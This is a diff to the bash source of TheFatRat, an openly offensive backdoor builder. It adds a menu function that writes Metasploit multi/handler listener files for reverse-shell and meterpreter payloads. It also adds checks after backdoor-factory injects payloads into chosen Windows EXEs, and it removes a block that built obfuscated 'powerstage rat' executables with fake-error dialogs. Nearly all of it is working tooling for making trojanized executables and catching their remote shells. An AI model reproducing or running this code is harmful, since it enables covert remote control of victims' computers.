@@ -398,6 +398,236 @@ cat << !
 
 !
 }
+function bkflst () {
+echo -e $okegreen "Do you want to create a listener for this configuration"
+echo -e $okegreen "to use in msfconsole in future ?"
+echo ""
+echo -ne $cyan "Choose y/n : "
+read sel
+case $sel in
+y|Y|Yes|yes|YES)
+echo ""
+echo -e $green "Write the name for this config . (ex : back-lst)"
+echo -ne "Filename : ";tput sgr0
+read fname
+if [ -z $fname ]
+then
+svf=$path/config/listeners/back-lst.rc
+rm -rf $svf >/dev/null 2>&1
+echo ""
+echo -e $orange "  +-------------------------------------------+"
+echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
+echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
+echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
+echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
+echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
+echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
+echo -e $orange "  +-------------------------------------------+"
+echo ""
+echo -ne $okegreen "  Choose Payload :";tput sgr0
+read pld
+if [ $pld == "1" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/shell_bind_tcp" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/back-lst.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "2" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/shell/reverse_tcp" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/back-lst.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "3" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/back-lst.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "4" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/meterpreter/reverse_tcp_dns" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/back-lst.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "5" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/meterpreter/reverse_http" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/back-lst.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "6" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/meterpreter/reverse_https" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/back-lst.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+else
+echo -e $red "Invalid option"
+echo ""
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+bkflst
+fi
+else
+svf=$path/config/listeners/$fname.rc
+rm -rf $fname >/dev/null 2>&1
+echo ""
+echo -e $orange "  +-------------------------------------------+"
+echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
+echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
+echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
+echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
+echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
+echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
+echo -e $orange "  +-------------------------------------------+"
+echo ""
+echo -ne $okegreen "  Choose Payload :";tput sgr0
+read pld
+if [ $pld == "1" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/shell_bind_tcp" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/$fname.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "2" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/shell/reverse_tcp" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/$fname.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "3" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/$fname.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "4" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/meterpreter/reverse_tcp_dns" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/$fname.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "5" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/meterpreter/reverse_http" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/$fname.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+elif [ $pld == "6" ]
+then
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD windows/meterpreter/reverse_https" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/$fname.rc"
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+else
+echo -e $red "Invalid option"
+echo ""
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+bkflst
+fi
+fi
+;;
+n|no|No|NO)
+echo -e $okegreen ""
+read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+;;
+*)
+clear
+menu
+;;
+esac
+}
 # Function to create a listener for apk
 function crlst() {
 echo -e $okegreen "Do you want to create a listener for this configuration"
@@ -1463,7 +1693,7 @@ for liste in icons/*.ico; do
     done
     echo -e $orange "  +---------------------+"
     echo ""
-    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE"
+    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE or press [ENTER] key for default icon"
     echo ""
                   echo -ne "   Filename : ";tput sgr0
                   read fname
@@ -1549,7 +1779,7 @@ for liste in icons/*.ico; do
     done
     echo -e $orange "  +---------------------+"
     echo ""
-    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE"
+    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE or press [ENTER] key for default icon"
     echo ""
                   echo -ne "   Filename : ";tput sgr0
                   read fname
@@ -1614,83 +1844,6 @@ fi
     fudwin
     fi
    fi
-# On this point , fatrat detected that there is no mingw64 installed , so will proceed automatically to rat 32bit creation
-    which i586-mingw32msvc-gcc >> $logfud 2>&1
-    if [ "$?" -eq "0" ]; then
-    echo ""
-    spinlong
-echo ""
-icfold="$path/icons"
-    lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
-    if [ $lit != 0 ]
-                  then
-echo -e $orange "  +--------------------+"
-echo -e $orange "  |$okegreen Current icons list$orange |"
-echo -e $orange "  +--------------------+"
-for liste in icons/*.ico; do
-                  echo ${liste##*/}
-    done
-    echo -e $orange "  +-------------------------+"
-    echo ""
-    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE"
-    echo ""
-                  echo -ne "   Filename : ";tput sgr0
-                  read fname
-fi
-if [ -z $fname ]
-                  then
-    echo ""
-echo -e $red "No file name was written"
-echo ""
- echo -e $okegreen "Building EXE with default icon"
-spinlong
-echo ""
-    echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
-    echo ""
-    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
-    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
-    echo -e $yellow "  Your Port     :$okegreen $yourport"
-    echo -e $yellow "  Rat Filename  :$okegreen $fira"
-    fstager="$path/$fira"
-    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
-    met="32"
-    pstagef
-    fi
-if [ ! -f $icfold/$fname ]
-then
-echo ""
-echo -e $red "The Filename you wrote does not exist in icons folder."
-echo ""
- echo -e $okegreen "Building EXE with default icon"
-spinlog
-echo ""
-echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
-    echo ""
-    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
-    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
-    echo -e $yellow "  Your Port     :$okegreen $yourport"
-    echo -e $yellow "  Rat Filename  :$okegreen $fira"
-    fstager="$path/$fira"
-    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
-    met="32"
-    pstagef
-else
-spinlog
-echo ""
-echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
-echo ""
-    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
-    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
-    echo -e $yellow "  Your Port     :$okegreen $yourport"
-    echo -e $yellow "  Rat Filename  :$okegreen $fira"
-    echo -e $yellow "  Icon filename :$okegreen $fname"
-    fstager=$path/$fira
-    echo ""
-  python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
-    met="32"
-    pstagef
-fi
-fi
     ;;
 2)
 #slowbutpowerfull selection
@@ -5234,10 +5387,27 @@ echo
   				echo ""
   				echo -e $okegreen""
   				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o output/$fira.exe
-        			echo -e "Shell Saved To :($path/backdoored/output/$fira.exe)  press [ENTER] key to continue"
+backout="$path/backdoored/output/$fira.exe"                            
+ if [ ! -f "$backout" ]
+then
+echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
+echo -e $red "One of the problable causes is that the EXE file you selected is not yet supported"
+echo ""
+echo -e $okegreen "Press [ENTER] key to continue to main menu " 
+read mmenu
+clear
+menu
+else
+echo ""
+echo -e $cyan "Your Rat was saved To :"
+echo -e $cyan "$path/backdoored/output/$fira.exe"
+echo ""
+bkflst
   				read bebeku
   				clear
   				menu
+
+fi
     elif test $fatrat == '5'
       then
       embedapk
@@ -5303,35 +5473,30 @@ echo
       echo ""
         else
       clear
-      exit
+      menu
         fi
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/temp/"
-      cd temp
-      rm *.rc >/dev/null 2>&1
-      cd ..
+      echo -e $red"  [*] $cyan Cleaning $path/temp/"
+      rm $path/temp/* >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/autorun/"
-      cd autorun
-      rm * >/dev/null 2>&1
-      cd ..
+      echo -e $red"  [*] $cyan Cleaning $path/autorun/"
+      rm $path/autorun/* >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/output/"
-      cd output
-      rm * >/dev/null 2>&1
-      cd ..
+      echo -e $red"  [*] $cyan Cleaning $path/output/"
+      rm $path/output/* >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/*.exe or apk"
+      echo -e $red"  [*] $cyan Cleaning $path/config/listeners/"
+      rm $path/config/listeners/* >/dev/null 2>&1
+      sleep 2
+      echo ""
+      echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
       rm *.exe *.apk  >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/backdoored/output/"
-      cd backdoored/output
-      rm * >/dev/null 2>&1
-      cd ..
-      cd ..
+      echo -e $red"  [*] $cyan Cleaning $path/backdoored/output/"
+      rm $path/backdoored/output/* >/dev/null 2>&1
       echo ""
       echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
       read anjeng
@@ -5464,10 +5629,27 @@ echo
   				echo ""
   				echo -e $okegreen""
   				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o output/$fira.exe
-        			echo -e "Shell Saved To :($path/backdoored/output/$fira.exe)  press [ENTER] key to continue"
+backout="$path/backdoored/output/$fira.exe"                            
+ if [ ! -f "$backout" ]
+then
+echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
+echo -e $red "One of the problable causes is that the EXE file you selected is not yet supported"
+echo ""
+echo -e $okegreen "Press [ENTER] key to continue to main menu " 
+read mmenu
+clear
+menu
+else
+echo ""
+echo -e $cyan "Your Rat was saved To :"
+echo -e $cyan "$path/backdoored/output/$fira.exe"
+echo ""
+bkflst
   				read bebeku
   				clear
   				menu
+
+fi
     elif test $fatrat == '5'
       then
       embedapk
@@ -5533,35 +5715,30 @@ echo
       echo ""
         else
       clear
-      exit
+      menu
         fi
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/temp/"
-      cd temp
-      rm *.rc >/dev/null 2>&1
-      cd ..
+      echo -e $red"  [*] $cyan Cleaning $path/temp/"
+      rm $path/temp/* >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/autorun/"
-      cd autorun
-      rm * >/dev/null 2>&1
-      cd ..
+      echo -e $red"  [*] $cyan Cleaning $path/autorun/"
+      rm $path/autorun/* >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/output/"
-      cd output
-      rm * >/dev/null 2>&1
-      cd ..
+      echo -e $red"  [*] $cyan Cleaning $path/output/"
+      rm $path/output/* >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/*.exe or apk"
+      echo -e $red"  [*] $cyan Cleaning $path/config/listeners/"
+      rm $path/config/listeners/* >/dev/null 2>&1
+      sleep 2
+      echo ""
+      echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
       rm *.exe *.apk  >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning /TheFatRat/backdoored/output/"
-      cd backdoored/output
-      rm * >/dev/null 2>&1
-      cd ..
-      cd ..
+      echo -e $red"  [*] $cyan Cleaning $path/backdoored/output/"
+      rm $path/backdoored/output/* >/dev/null 2>&1
       echo ""
       echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
       read anjeng
